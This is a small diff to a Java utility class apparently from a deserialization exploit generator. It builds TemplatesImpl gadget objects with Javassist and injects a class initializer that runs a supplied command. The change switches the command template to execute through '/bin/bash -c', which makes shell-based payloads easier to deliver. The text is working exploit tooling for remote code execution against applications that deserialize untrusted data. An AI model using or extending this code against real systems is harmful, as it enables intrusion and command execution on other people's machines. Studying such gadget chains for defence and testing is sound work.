@@ -14,7 +14,6 @@ import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.io.ObjectOutputStream;
 import java.lang.reflect.Field;
-import java.util.Random;
 
 public class Util {
     public static byte[] serialize(Object object) {
@@ -61,7 +60,7 @@ public class Util {
     public static TemplatesImpl createTemplates(String command) {
         ClassPool pool = ClassPool.getDefault();
         CtClass ctClass = pool.makeClass("Foo" + RandomID.randomID().substring(0, 4));
-        String commandTemplate = "java.lang.Runtime.getRuntime().exec(\"%s\");";
+        String commandTemplate = "java.lang.Runtime.getRuntime().exec(new String[]{\"/bin/bash\", \"-c\", \"%s\"});";
         byte[] bytes = new byte[1024];
         try {
             ctClass.makeClassInitializer().insertBefore(String.format(commandTemplate, command));
